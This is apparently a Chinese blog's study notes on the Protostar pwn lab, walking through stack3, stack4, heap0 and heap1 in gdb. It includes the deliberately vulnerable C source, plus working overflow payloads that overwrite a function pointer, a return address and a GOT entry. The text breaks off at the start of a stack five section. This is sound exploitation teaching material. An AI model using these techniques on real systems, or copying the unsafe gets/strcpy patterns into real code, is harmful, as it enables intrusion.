<h4 id="汇编分析"><a href="#汇编分析" class="headerlink" title="汇编分析"></a>汇编分析</h4><p>使用gdb打开程序，输入指令查看汇编代码</p>
<pre class="line-numbers language-none"><code class="language-none">set disassembly-flavor intel
disassemble main<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><img src="/img/1731312941256.png"></p>
<p>程序最关键两行</p>
<pre class="line-numbers language-none"><code class="language-none">0x08048471 &lt;main+57&gt;:   mov    eax,DWORD PTR [esp+0x5c]
0x08048475 &lt;main+61&gt;:   call   eax<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>它将esp+0x5c地址的值转移到了eax寄存器里，然后调用call指令执行eax寄存器里的值</p>
<p>也就是说，我们只要将esp+0x5c地址的内容覆盖成win函数的地址，就能成功破解程序</p>
<h3 id="程序动态分析"><a href="#程序动态分析" class="headerlink" title="程序动态分析"></a>程序动态分析</h3><p>我们在0x08048471地址处下一个断点</p>
<pre class="line-numbers language-none"><code class="language-none">b *0x08048471 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p> 然后设置一下自动运行的命令 </p>
<pre class="line-numbers language-none"><code class="language-none">define hook-stop
info registers   &#x2F;&#x2F;显示寄存器里的地址
x&#x2F;24wx $esp      &#x2F;&#x2F;显示esp寄存器里的内容
x&#x2F;2i $eip        &#x2F;&#x2F;显示eip寄存器里的内容
end              &#x2F;&#x2F;结束<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>运行程序，由于if判断，fp的值不能为零才能进入if判断，但是程序设置的fp的值为0，我们先输入一长串的垃圾字符，覆盖原来的值 </p>
<p><img src="/img/1731313027542.png"></p>
<p> 查看esp+0x5c地址处的值 </p>
<pre class="line-numbers language-none"><code class="language-none">x&#x2F;wx $esp+0x5c<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/img/1731313276304.png"></p>
<p>fp函数指针的值就在图中圈出来的地方，根据计算，我们需要64个字符+win函数地址才能控制fp函数指针</p>
<p>这时候我们可以用objdump工具来查看win函数地址</p>
<pre class="line-numbers language-none"><code class="language-none">objdump -x stack3 | grep win<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/img/1731313336511.png"></p>
<p>或者直接gdb命令查看win地址</p>
<pre class="line-numbers language-none"><code class="language-none">disassemble win<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/img/1731313490898.png"></p>
<p> 知道了win函数地址后，直接运行以下命令就能破解程序 </p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">//</span><span class="token number">64</span>个垃圾字符<span class="token operator">+</span>win函数地址
python <span class="token operator">-</span>c <span class="token string">"print('A'*(4*16)+'\x24\x84\x04\x08')"</span> <span class="token operator">|</span> <span class="token punctuation">.</span><span class="token operator">/</span>stack3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><img src="/img/1731313583965.png"></p>
<h2 id="Stack-Four"><a href="#Stack-Four" class="headerlink" title="Stack Four"></a>Stack Four</h2><h3 id="程序静态分析-1"><a href="#程序静态分析-1" class="headerlink" title="程序静态分析"></a>程序静态分析</h3><p>stack four源码：</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>

<span class="token keyword">void</span> <span class="token function">win</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"code flow successfully changed\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">char</span> buffer<span class="token punctuation">[</span><span class="token number">64</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

  <span class="token function">gets</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这个程序很简单，就不多做介绍了，和上一个一模一样，只不过将设置的fp函数指针去掉了，我们需要自己控制程序指针进行跳转到win函数地址</p>
<p>直接进行程序动态分析</p>
<h3 id="程序动态分析-1"><a href="#程序动态分析-1" class="headerlink" title="程序动态分析"></a>程序动态分析</h3><p>使用gdb打开程序，输入指令查看汇编代码</p>
<pre class="line-numbers language-none"><code class="language-none">set disassembly-flavor intel
disassemble main<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><img src="/img/1731313813226.png"></p>
<p> 代码很少，我们要做的只有一件事，控制ret指令的返回地址，让程序跳转到win函数地址执行参数 </p>
<h4 id="leave和ret指令"><a href="#leave和ret指令" class="headerlink" title="leave和ret指令"></a>leave和ret指令</h4><p>在汇编语言中，ret指令用于从子程序返回到调用它的主程序。当执行到ret指令时，程序会跳转到主代码的地址，继续执行主程序的代码</p>
<p>在汇编语言中，leave指令用于清空栈，它会清除我们这次运行程序时获取的用户输入之类的，还原之前的状态</p>
<pre class="line-numbers language-none"><code class="language-none">mov esp,ebp
pop ebp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>我们在leave指令的地址下一个断点</p>
<pre class="line-numbers language-none"><code class="language-none">b *0x0804841d<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/img/1731314096507.png"></p>
<p> 运行程序，然后随便输入一些字符，然后查看栈里的内容，记录下来，之后会用到 </p>
<p><img src="/img/1731314372486.png"></p>
<p>然后输入n执行下一条指令ret，查看寄存器</p>
<p><img src="/img/1731314261554.png"></p>
<p>当前eip寄存器的值为0xb7eadc76，也就是说，执行了ret指令后，程序回到了0xb7eadc76继续执行之后的命令</p>
<p>但是返回的地址也是在栈中的</p>
<p><img src="/img/1731314396651.png"></p>
<p> 根据计算，我们需要输入76个字符+win函数地址才能覆盖原来ret返回的地址，让程序跳转到win函数地址处执行</p>
<p><img src="/img/1731314637239.png"></p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">python <span class="token operator">-</span>c <span class="token string">"print('A'*(4*19)+'\xf4\x83\x04\x08')"</span> <span class="token operator">|</span> <span class="token punctuation">.</span><span class="token operator">/</span>stack4<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/img/1731314460207.png"></p>
<p>成功破解</p>
]]></content>
      <categories>
        <category>学习</category>
      </categories>
      <tags>
        <tag>笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>Pwn-protostar靶场5 heap_zero</title>
    <url>/2024/1115eb8e.html</url>
    <content><![CDATA[<span id="more"></span>

<h1 id="Pwn-protostar靶场5-heap-zero"><a href="#Pwn-protostar靶场5-heap-zero" class="headerlink" title="Pwn-protostar靶场5 heap_zero"></a>Pwn-protostar靶场5 heap_zero</h1><h2 id="什么是堆"><a href="#什么是堆" class="headerlink" title="什么是堆"></a>什么是堆</h2><p>堆是<a href="https://so.csdn.net/so/search?q=%E5%8A%A8%E6%80%81%E5%86%85%E5%AD%98%E5%88%86%E9%85%8D&spm=1001.2101.3001.7020">动态内存分配</a>的区域，程序在运行时用来分配内存。它与栈不同，栈用于静态分配内存，并且具有固定的大小</p>
<p>程序使用如malloc、<a href="https://so.csdn.net/so/search?q=calloc&spm=1001.2101.3001.7020">calloc</a>、realloc等函数在堆上动态分配内存。当内存不再需要时，使用free函数释放。</p>
<p>接下来就用实战来讲解堆的运作机制</p>
<h2 id="heap-0"><a href="#heap-0" class="headerlink" title="heap 0"></a>heap 0</h2><p>查看源码：</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span>

<span class="token keyword">struct</span> <span class="token class-name">data</span> <span class="token punctuation">&#123;</span>  #定义了一个名为data的结构体
  <span class="token keyword">char</span> name<span class="token punctuation">[</span><span class="token number">64</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  #包含一个<span class="token number">64</span>字节大小的字符数组name
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

<span class="token keyword">struct</span> <span class="token class-name">fp</span> <span class="token punctuation">&#123;</span>  #定义了一个名为fp的结构体
  <span class="token keyword">int</span> <span class="token punctuation">(</span><span class="token operator">*</span>fp<span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  #包含了一个函数指针fp
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

<span class="token keyword">void</span> <span class="token function">winner</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  #自定义函数winner
<span class="token punctuation">&#123;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"level passed\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  #输出level passed
<span class="token punctuation">&#125;</span>

<span class="token keyword">void</span> <span class="token function">nowinner</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  #自定义函数nowinner
<span class="token punctuation">&#123;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"level has not been passed\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  #输出level has not been passed
<span class="token punctuation">&#125;</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">)</span>  #主函数，从命令行获取参数
<span class="token punctuation">&#123;</span>
  <span class="token keyword">struct</span> <span class="token class-name">data</span> <span class="token operator">*</span>d<span class="token punctuation">;</span>  #声明了一个指向 <span class="token keyword">struct</span> <span class="token class-name">data</span> 类型结构体的指针 d
  <span class="token keyword">struct</span> <span class="token class-name">fp</span> <span class="token operator">*</span>f<span class="token punctuation">;</span>  #声明了一个指向 <span class="token keyword">struct</span> <span class="token class-name">fp</span> 类型结构体的指针 f

  d <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">data</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   #给data结构体分配内存
  f <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">fp</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  #给fp结构体分配内存
  f<span class="token operator">-></span>fp <span class="token operator">=</span> nowinner<span class="token punctuation">;</span>  #fp结构体中的函数指针初始化为指向nowinner函数

  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"data is at %p, fp is at %p\n"</span><span class="token punctuation">,</span> d<span class="token punctuation">,</span> f<span class="token punctuation">)</span><span class="token punctuation">;</span>  #输出data和fp结构体的内存地址

  <span class="token function">strcpy</span><span class="token punctuation">(</span>d<span class="token operator">-></span>name<span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  #strcpy函数将命令行提供的第一个参数，复制到data结构体的name数组中
  
  f<span class="token operator">-></span><span class="token function">fp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  #调用函数指针指向的函数nowinner

<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>漏洞发生在strcpy函数处，strcpy函数不会检查目标缓冲区的大小，如果我们提供的参数超过64字节，它将导致缓冲区溢出，如果发生了缓冲区溢出，并且覆盖了f-&gt;fp的值，那么可以使它指向winner函数，调用winner函数</p>
<p>我们先在第一个malloc函数调用的地方下一个断点，然后执行到断点处，来看看堆是怎么运行的<br><img src="/img/1731651000226.png"></p>
<p><img src="/img/1731651041952.png"></p>
<p> 现在停在了malloc函数处，还没有执行该指令，可以看到程序空间里是没有堆的 </p>
<p><img src="/img/1731651095275.png"></p>
<p> 输入n执行malloc函数，再次查看程序空间 </p>
<p><img src="/img/1731651128567.png"></p>
<p> 可以看到，多出了一个heap空间，也就是堆，地址是<strong>0x804a000-0x806b000</strong>，我们查看这个堆空间里的数据 </p>
<p><img src="/img/1731651201278.png"></p>
<p><strong>现在堆里只有两个数据，0x49-1，0x48是第一个mallco函数给我们分配的空间大小，为什么要减一呢，因为在这个堆中保存数据是，为了区分是否是空闲区域，都会在表示大小的值后面加一个1，+1了就说明当前空间已经被存放了数据，那这里为什么后面存放的数据都是0呢，是因为这个程序是从命令行参数里获取值然后保存的，我们运行程序时没有输入参数，所以这里都是0</strong></p>
<p><img src="/img/1731651341707.png"></p>
<p><img src="/img/1731651402046.png"></p>
<p> name函数大小设置的是64字节，为什么程序给我们分配了72字节的空间，其实是这样算的 </p>
<p><img src="/img/1731651437317.png"></p>
<p>程序还将前面保留的四个字节空闲空间和本身表示大小的空间算进去了，也就是72-8=64</p>
<p>而最后的0x20fb9，表示空余堆空间的大小，我们在程序执行strcpy函数的地方下一个断点，这个地方是程序将我们输入的值存入堆里的地方</p>
<p><img src="/img/1731651560618.png"></p>
<p> 我们重新运行程序，输入a，执行strcpy函数的指令，再在查看栈空间 </p>
<p><img src="/img/1731651801387.png"></p>
<p><img src="/img/1731651845072.png"></p>
<p> 程序已经将我们输入的8个a的十六进制值放入了堆，并且下面还有第二个mallco函数的空间 </p>
<p><img src="/img/1731651909176.png"></p>
<p> 而这个0x8048478则是nowinner函数地址 </p>
<p><img src="/img/1731651969975.png"></p>
<p>前面说过，strcpy函数不会检查目标缓冲区的大小，如果我们提供的参数超过64字节，它将导致缓冲区溢出，如果发生了缓冲区溢出，并且覆盖了f-&gt;fp的值，那么可以使它指向winner函数，调用winner函数，我们输入76个字符就能完整覆盖nowinner函数地址，控制程序跳转的地址</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">python <span class="token operator">-</span>c <span class="token string">"print('A'*72 + 'B'*4)"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/img/1731652294786.png"></p>
<p><img src="/img/1731652379886.png"></p>
<p>这里程序提示跳转到了0x42424242的地址，也就是我们输入的BBBB，这时我们查看堆空间 </p>
<p><img src="/img/1731652460733.png"></p>
<p>这表示 我们已经将nowinner函数地址给覆盖了 </p>
<p><img src="/img/1731652503710.png"></p>
<p> 我们将BBBB改为winner函数地址，就成功破解了程序 </p>
<p><img src="/img/1731652536682.png"></p>
<p> 我们可以使用echo工具来输入不可见字符 </p>
<pre class="line-numbers language-none"><code class="language-none">.&#x2F;heap0 &quot;&#96;&#x2F;bin&#x2F;echo -ne &quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x64\x84\x04\x08&quot;&#96;&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/img/1731652676257.png"></p>
<p>成功跳转到winner函数</p>
<p><img src="/img/1731652703072.png"></p>
<p>堆是一个很难的部分，为了方便入门，这篇文章只是简单的介绍了一些堆的运作机制，之后的文章再慢慢介绍其他的机制</p>
]]></content>
      <categories>
        <category>学习</category>
      </categories>
      <tags>
        <tag>笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>Pwn-protostar靶场6 heap one</title>
    <url>/2024/1116aeb4.html</url>
    <content><![CDATA[<span id="more"></span>

<h1 id="Pwn-protostar靶场6-heap-one"><a href="#Pwn-protostar靶场6-heap-one" class="headerlink" title="Pwn-protostar靶场6 heap one"></a>Pwn-protostar靶场6 heap one</h1><h2 id="程序静态分析"><a href="#程序静态分析" class="headerlink" title="程序静态分析"></a>程序静态分析</h2><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span>

<span class="token keyword">struct</span> <span class="token class-name">internet</span> <span class="token punctuation">&#123;</span>  #定义了一个名为 internet 的结构体
  <span class="token keyword">int</span> priority<span class="token punctuation">;</span>  #定义了一个<span class="token keyword">int</span> 类型的 priority函数
  <span class="token keyword">char</span> <span class="token operator">*</span>name<span class="token punctuation">;</span>  #定义了一个 <span class="token keyword">char</span> 指针 name 函数
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>

<span class="token keyword">void</span> <span class="token function">winner</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  #winner函数
<span class="token punctuation">&#123;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"and we have a winner @ %d\n"</span><span class="token punctuation">,</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  #输出and we have a winner @ <span class="token operator">%</span>d\n"<span class="token punctuation">,</span> <span class="token function">time</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">)</span>  #主函数，参数是从命令行里获取的
<span class="token punctuation">&#123;</span>
  <span class="token keyword">struct</span> <span class="token class-name">internet</span> <span class="token operator">*</span>i1<span class="token punctuation">,</span> <span class="token operator">*</span>i2<span class="token punctuation">,</span> <span class="token operator">*</span>i3<span class="token punctuation">;</span>  #声明了三个指针变量，i1、i2和i3，它们都是指向<span class="token keyword">struct</span> <span class="token class-name">internet</span>类型的结构体的指针

  i1 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">internet</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  #为 internet 结构体分配内存
  i1<span class="token operator">-></span>priority <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>  #访问 i1 指向的结构体中的 priority，赋予<span class="token number">1</span>值
  i1<span class="token operator">-></span>name <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  #分配<span class="token number">8</span>个字节的内存

  i2 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">internet</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   #为 internet 结构体分配内存
  i2<span class="token operator">-></span>priority <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>  #访问 i1 指向的结构体中的 priority，赋予<span class="token number">2</span>值
  i2<span class="token operator">-></span>name <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  #分配<span class="token number">8</span>个字节的内存

  <span class="token function">strcpy</span><span class="token punctuation">(</span>i1<span class="token operator">-></span>name<span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  #将第一个命令行参数复制到 i1
  <span class="token function">strcpy</span><span class="token punctuation">(</span>i2<span class="token operator">-></span>name<span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  #将第二个命令行参数复制到 i2

  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"and that's a wrap folks!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  输出and that's a wrap folks<span class="token operator">!</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p> 主函数的分配指针看着有些复杂，我们实际调试一下就能理解了 </p>
<h2 id="程序动态分析"><a href="#程序动态分析" class="headerlink" title="程序动态分析"></a>程序动态分析</h2><p>使用gdb打开程序，在第一个<a href="https://so.csdn.net/so/search?q=malloc%E5%87%BD%E6%95%B0&spm=1001.2101.3001.7020">malloc函数</a>处下一个断点</p>
<p><img src="/img/1731737324481.png"></p>
<p><img src="/img/1731737356006.png"></p>
<p> 我们要输入两个命令行参数才能运行程序 </p>
<p><img src="/img/1731737453536.png"></p>
<p><img src="/img/1731737478841.png"></p>
<p>现在停在了这里，我们可以输入n执行malloc函数，为 internet 结构体分配内存，i1 和 i2 是指向这些结构体的指针 </p>
<p><img src="/img/1731737819279.png"></p>
<p><img src="/img/1731737551541.png"></p>
<p>现在程序给我们分配了一个堆，地址是0x804a000-0x806b000，现在可以查看堆空间里的内容 </p>
<p><img src="/img/1731737607710.png"></p>
<p><strong>现在堆里只有两个数据，0x11-1，0x10是第一个mallco函数给我们分配的空间大小，为什么要减一呢，因为在这个堆中保存数据是为了区分是否是空闲区域，都会在表示大小的值后面加一个1，+1了就说明当前空间已经被存放了数据，那这里为什么后面存放的数据都是0呢，是因为这个程序是从命令行参数里获取值然后保存的，我们运行程序时没有输入参数，所以这里都是0</strong></p>
<p><strong>而最后的0x20ff1，表示空余的堆空间的大小</strong></p>
<p>输入n，执行下一个指令，然后查看堆空间</p>
<p><img src="/img/1731737839457.png"></p>
<p><img src="/img/1731737857928.png"></p>
<p> 这里按照程序 i1-&gt;priority = 1; 访问 i1 指向的结构体中的 priority，赋予1值 </p>
<p><img src="/img/1731737908637.png"></p>
<p> 输入n，执行下一个指令 </p>
<p><img src="/img/1731737938218.png"></p>
<p><img src="/img/1731738003543.png"></p>
<p>程序给我们分配8个字节的内存，0x0804a018是之后存放这8个字节的堆地址，前面标记的整数可以很方便帮助我们计算，所以第18的地址是图中圈起来的，程序会将我们输入的值，放入这里 </p>
<p><img src="/img/1731738159864.png"></p>
<p> 输入n，执行第二个分配堆空间的操作 </p>
<p><img src="/img/1731738198013.png"></p>
<p><img src="/img/1731738262263.png"></p>
<p>操作逻辑是和第一个一样的，0x0804a038地址也是我们第二个参数存放的地址，也就是图片上圈起来的地方 </p>
<p><img src="/img/1731738310095.png"></p>
<p> 现在我们将输入的内容放入堆中 <img src="/img/1731738342287.png"></p>
<p><img src="/img/1731738370202.png"></p>
<p>了解了这个程序的运作机制，现在我们可以想想怎么破解程序了</p>
<p>漏洞点还是出在strcpy函数身上，strcpy函数不会检查目标缓冲区的大小，很容易导致缓冲区溢出，我们可以覆盖掉第二个参数的写入地址0x0804a038，那么程序就可以在任意地址写入我们指定的值</p>
<h2 id="什么是plt表与got表"><a href="#什么是plt表与got表" class="headerlink" title="什么是plt表与got表"></a>什么是plt表与got表</h2><p>他是动态链接库的，意思是从libc里调用的函数，他不是二进制文件本身里面自带的，而从本机上的libc库中调用的，这样就能缩小文件体积</p>
<p>而plt表的作用是当程序需要调用一个外部函数时，它首先跳转到PLT表中寻找该函数对应的入口，PLT入口包含跳转指令，然后跳转到GOT表中的相应地址，GOT中的地址会指向解析函数，之后解析函数将实际的函数地址写入GOT表，以便后续直接跳转调用函数</p>
<p>实际操作一下就理解了 </p>
<p><img src="/img/1731738608374.png"></p>
<p> 这里puts函数的plt表地址是0x80483cc，我们可以查看这个地址 </p>
<p><img src="/img/1731738627314.png"></p>
<p> 然后跳转到了got表的地址，调用puts函数 <img src="/img/1731738645734.png"></p>
<p>这里我们可以覆盖掉printf函数got表地址，让程序执行printf函数时跳转到winner函数地址 </p>
<p><img src="/img/1731738679636.png"></p>
<h2 id="破解"><a href="#破解" class="headerlink" title="破解"></a>破解</h2><p>覆盖第二个malloc写入字符的地址，所需要的垃圾字符数</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">python <span class="token operator">-</span>c <span class="token string">"print('A'*20)"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>因为从第一个malloc输入字符位置到第二个malloc写入字符地址的距离是4x5=20</p>
<p><img src="/img/1731738893262.png"></p>
<p> 我们可以使用echo工具来输入不可见字符，printf函数的got表地址0x8049774</p>
<p><img src="/img/1731738997800.png"></p>
<p>这里gdb将printf函数解析成了puts函数，第一个参数确定了，我们还需要winner函数的地址 </p>
<p><img src="/img/1731739076391.png"></p>
<pre class="line-numbers language-none"><code class="language-none">.&#x2F;heap1 &quot;&#96;&#x2F;bin&#x2F;echo -ne &quot;AAAAAAAAAAAAAAAAAAAA\x74\x97\x04\x08&quot;&#96;&quot; &quot;&#96;&#x2F;bin&#x2F;echo -ne &quot;\x94\x84\x04\x08&quot;&#96;&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/img/1731739193665.png"></p>
<p> 成功跳转到winner函数，这里我们也可以使用gdb查看堆空间 </p>
<p><img src="/img/1731739329968.png"></p>
<p>原本的0x0804a038被我们改成了printf函数got表的地址，之后我们输入的第二个参数就会覆盖掉printf函数got表原本的地址，变成winner函数地址，当程序调用printf函数时，就会跳转到winner函数 </p>
]]></content>
      <categories>
        <category>学习</category>
      </categories>
      <tags>
        <tag>笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>Pwn-protostar靶场4 stack five,，stack six，stack seven</title>
    <url>/2024/1114f0a4.html</url>
    <content><![CDATA[<span id="more"></span>

<h1 id="Pwn-protostar靶场4-stack-five-，stack-six，stack-seven"><a href="#Pwn-protostar靶场4-stack-five-，stack-six，stack-seven" class="headerlink" title="Pwn-protostar靶场4 stack five,，stack six，stack seven"></a>Pwn-protostar靶场4 stack five,，stack six，stack seven</h1><h2 id="Stack-Five"><a href="#Stack-Five" class="headerlink" title="Stack Five"></a>Stack Five</h2><h3 id="程序静态分析"><a href="#程序静态分析" class="headerlink" title="程序静态分析"></a>程序静态分析</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">char</span> buffer<span class="token punctuation">[</span><span class="token number">64</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

  <span class="token function">gets</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>这个程序很简单，只有两行，作用只是接受我们的输入</p>
<h4 id="setuid"><a href="#setuid" class="headerlink" title="setuid"></a>setuid</h4><p>什么是setuid？</p>
